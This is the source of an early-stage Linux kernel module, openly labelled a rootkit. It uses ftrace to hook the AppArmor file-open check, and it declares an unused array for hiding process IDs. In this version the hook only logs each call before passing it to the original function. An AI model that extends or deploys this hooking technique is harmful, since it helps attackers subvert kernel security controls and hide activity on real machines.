#include "ftrace_helper.h"
#include <asm-generic/errno-base.h>
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_ns.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ceald");
MODULE_DESCRIPTION("acidarmor rootkit");
MODULE_VERSION("0.1");

#define MAX_PIDS 64
static pid_t hidden_pids[MAX_PIDS];

// apparmor open file
//
static asmlinkage int (*orig_file_open)(struct file *file);
static asmlinkage int acidarmor_file_open(struct file *file) {
  printk(KERN_INFO "file opened\n");

  return orig_file_open(file);
}

static struct ftrace_hook hooks[] = {
    HOOK("apparmor_file_open", acidarmor_file_open, &orig_file_open),
};

/* Module initialization function */
static int __init acid_init(void) {

  /* Hook the syscall and print to the kernel buffer */
  int err;
  err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  if (err)
    return err;

  printk(KERN_INFO "Hewo pwincess\n");

  return 0;
}

static void __exit acid_exit(void) {
  /* Unhook and restore the syscall and print to the kernel buffer */
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
  printk(KERN_INFO "bye pwincess\n");
}

module_init(acid_init);
module_exit(acid_exit);
